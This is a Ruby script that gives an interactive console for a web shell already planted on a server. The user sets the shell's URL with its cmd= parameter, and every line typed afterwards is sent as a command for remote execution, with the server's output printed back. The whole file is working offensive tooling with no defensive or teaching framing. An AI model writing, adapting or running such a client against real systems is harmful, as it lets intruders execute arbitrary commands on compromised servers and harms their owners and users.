#!/usr/bin/env ruby

require 'readline'
require 'net/http'
require 'uri'


class String
  def red; colorize(self, "\e[31m"); end
  def green; colorize(self, "\e[32m"); end
  def yellow; colorize(self, "\e[1m\e[33m"); end
  def bold; colorize(self, "\e[1m"); end
  def colorize(text, color_code)  "#{color_code}#{text}\e[0m" end
end




class Commands

  attr_accessor :status # make status is our checker of all this class url

  def cmd_set(url)
    if alive?(url) == false
      puts "[+] ".red + "Invalid URL: #{url}\n"
      self.status = false
    elsif alive?(url).nil?
      puts "[!] ".yellow + "Invalid URL: #{url}\n"
      puts "Usage: set http://domain.com/shellname.ext?cmd="
      self.status = false
    else
      self.status = true
      puts "[+] ".green + "URL loaded successfully."
      puts "Ready to send your commands."
      @uri.query = @uri.query.scan(/.*=/)[0]
    end
  end

  def cmd_send(cmd)
    begin
      cmd = URI.encode(cmd)
      request = Net::HTTP::Get.new("#{@uri.request_uri}#{cmd}")
      response = @http.request(request)
      puts response.body
    rescue
      puts "[!] ".yellow + "Make sure shell URL is loaded"
      puts "Usage: set http://domain.com/shellname.ext?cmd="
    end

  end

  def cmd_help(cmd=nil)
    puts "\n"
    puts "Command".ljust(10," ") + "Description"
    puts ("-"*"Command".size).ljust(10," ") + "-" * "Description".size
    puts "set".ljust(10," ") + "set [URL] :Assign Shell URL - command execution will be the default once set is valid"
    puts "help".ljust(10," ") + "Show this screen"
    puts "exit".ljust(10," ") + "exit the console"
    puts "\n"
  end

  def cmd_exit(cmd=nil)
    puts "See you l8er ;)".bold
    exit
  end


  def alive?(url)

    begin
      @uri          = URI.parse(url)
      @http         = Net::HTTP.new(@uri.host, @uri.port)
      @http.use_ssl = true if @uri.scheme == 'https'
      response      = @http.head(@uri.path).code.to_i

      if response == 200
        return true
      else
        return false
      end
    rescue
      #puts "[!] ".yellow + "Invalid URL: #{url}\n"
      #puts "Usage: set http://domain.com/shellname.ext?cmd="
    end

  end

  def run_command(cmd="")
    cmd =  cmd.split
    if self.respond_to?("cmd_#{cmd.first}")
      send("cmd_#{cmd.first}", cmd.last)
    elsif cmd.empty? or cmd.nil?
      # Do Nothing!
    else
      cmd_send(cmd.join(" "))
    end
  end

end


MAIN = ['help', 'set', 'exit'].sort
comp = proc { |s| MAIN.grep(/^#{Regexp.escape(s)}/) }
Readline.completion_proc = comp

def console
  @commands = Commands.new
  command = ""

  trap('INT', 'SIG_IGN')
  while true
    case
      when @commands.status == true
        command =  Readline.readline('Shell '.bold + '-> '.green.bold, true)
        @commands.run_command(command)
      else
        command =  Readline.readline('Shell -> '.bold, true)
        @commands.run_command(command)
    end
  end

end


console

